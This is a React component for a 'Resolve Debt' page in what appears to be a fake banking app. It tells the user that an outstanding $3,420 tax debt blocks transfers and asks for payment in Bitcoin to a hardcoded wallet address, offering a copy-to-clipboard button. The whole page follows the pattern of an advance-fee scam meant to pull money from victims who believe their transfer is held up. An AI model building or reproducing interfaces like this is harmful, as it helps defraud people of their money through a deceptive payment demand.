import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import {
    Box,
    Card,
    Typography,
    Button,
    Alert,
    TextField,
    IconButton,
    Chip,
} from '@mui/material';
import ArrowBackIcon from '@mui/icons-material/ArrowBack';
import ContentCopyIcon from '@mui/icons-material/ContentCopy';

const ResolveDebt = () => {
    const navigate = useNavigate();
    const [copied, setCopied] = useState(false);
    
    const BITCOIN_ADDRESS = 'bc1qy70c2mq5m6eadm325yn8jmrvwgrqt49cf8ft56';
    const DEBT_AMOUNT = 3420;

    const handleCopyAddress = async () => {
        try {
            await navigator.clipboard.writeText(BITCOIN_ADDRESS);
            setCopied(true);
            setTimeout(() => setCopied(false), 2000);
        } catch (err) {
            console.error('Failed to copy address:', err);
        }
    };

    const handleBackToTransfer = () => {
        navigate('/transfer');
    };

    return (
        <Box sx={{ 
            maxWidth: 600, 
            mx: 'auto', 
            p: 3,
            pb: 10,
            bgcolor: 'background.default',
            minHeight: '100vh'
        }}>
            {/* Header */}
            <Box sx={{ mb: 4, textAlign: 'center' }}>
                <Typography variant="h4" sx={{ fontWeight: 700, color: '#1e3a8a' }}>
                    Resolve Debt
                </Typography>
            </Box>

            {/* Debt Information Card */}
            <Card sx={{ p: 4, mb: 3, borderRadius: 3 }}>
                <Typography variant="h6" sx={{ mb: 3, fontWeight: 600, color: '#1f2937' }}>
                    Outstanding Tax Debt
                </Typography>
                
                <Alert severity="warning" sx={{ mb: 3, borderRadius: 2 }}>
                    <Typography variant="body1" sx={{ fontWeight: 500 }}>
                        You have an outstanding tax debt that must be resolved before you can make transfers.
                    </Typography>
                </Alert>

                <Box sx={{ 
                    display: 'flex', 
                    alignItems: 'center', 
                    justifyContent: 'space-between',
                    p: 3,
                    bgcolor: '#fef3c7',
                    borderRadius: 2,
                    border: '1px solid #f59e0b'
                }}>
                    <Typography variant="h5" sx={{ fontWeight: 600, color: '#92400e' }}>
                        Amount Due:
                    </Typography>
                    <Typography variant="h4" sx={{ fontWeight: 700, color: '#92400e' }}>
                        ${DEBT_AMOUNT.toLocaleString()}
                    </Typography>
                </Box>
            </Card>

            {/* Bitcoin Payment Option */}
            <Card sx={{ p: 4, mb: 3, borderRadius: 3 }}>
                <Typography variant="h6" sx={{ mb: 3, fontWeight: 600, color: '#1f2937' }}>
                    Pay with Bitcoin
                </Typography>
                
                <Typography variant="body1" sx={{ mb: 3, color: 'text.secondary' }}>
                    You can resolve your outstanding debt by sending the exact amount in Bitcoin to the address below.
                </Typography>

                <Box sx={{ 
                    p: 3, 
                    bgcolor: '#f8fafc', 
                    borderRadius: 2,
                    border: '1px solid #e2e8f0'
                }}>
                    <Typography variant="body2" sx={{ mb: 2, color: 'text.secondary', fontWeight: 500 }}>
                        Bitcoin Address:
                    </Typography>
                    
                    <Box sx={{ 
                        display: 'flex', 
                        alignItems: 'center', 
                        gap: 2,
                        p: 2,
                        bgcolor: 'white',
                        borderRadius: 1,
                        border: '1px solid #e2e8f0'
                    }}>
                        <Typography 
                            variant="body1" 
                            sx={{ 
                                fontFamily: 'monospace',
                                fontSize: '0.875rem',
                                color: '#1f2937',
                                flex: 1,
                                wordBreak: 'break-all'
                            }}
                        >
                            {BITCOIN_ADDRESS}
                        </Typography>
                        <IconButton 
                            onClick={handleCopyAddress}
                            sx={{ 
                                color: copied ? '#10b981' : '#6b7280',
                                '&:hover': {
                                    bgcolor: 'rgba(16, 185, 129, 0.1)',
                                }
                            }}
                        >
                            <ContentCopyIcon />
                        </IconButton>
                    </Box>
                    
                    {copied && (
                        <Typography variant="body2" sx={{ mt: 1, color: '#10b981', fontWeight: 500 }}>
                            Address copied to clipboard!
                        </Typography>
                    )}
                </Box>

                <Box sx={{ mt: 3, display: 'flex', alignItems: 'center', gap: 1 }}>
                    <Box 
                        component="span" 
                        sx={{ 
                            width: 24, 
                            height: 24, 
                            bgcolor: '#f7931a',
                            borderRadius: '50%',
                            display: 'flex',
                            alignItems: 'center',
                            justifyContent: 'center',
                            color: 'white',
                            fontSize: '0.75rem',
                            fontWeight: 'bold'
                        }}
                    >
                        ₿
                    </Box>
                    <Typography variant="body2" sx={{ color: 'text.secondary' }}>
                        Send exactly ${DEBT_AMOUNT} USD worth of Bitcoin
                    </Typography>
                </Box>
            </Card>

            {/* Important Notice */}
            <Alert severity="info" sx={{ mb: 3, borderRadius: 2 }}>
                <Typography variant="body2">
                    <strong>Important:</strong> Please ensure you send the exact amount in Bitcoin equivalent to ${DEBT_AMOUNT} USD. 
                    The transaction may take 10-30 minutes to confirm on the blockchain.
                </Typography>
            </Alert>

            {/* Back to Transfer Button */}
            <Button
                onClick={handleBackToTransfer}
                variant="outlined"
                fullWidth
                size="large"
                startIcon={<ArrowBackIcon />}
                sx={{
                    height: 56,
                    borderRadius: 2,
                    fontSize: '1.1rem',
                    fontWeight: 600,
                    borderColor: '#1e3a8a',
                    color: '#1e3a8a',
                    '&:hover': {
                        borderColor: '#1e40af',
                        bgcolor: 'rgba(30, 58, 138, 0.04)',
                    }
                }}
            >
                Back to Transfer Page
            </Button>
        </Box>
    );
};

export default ResolveDebt;
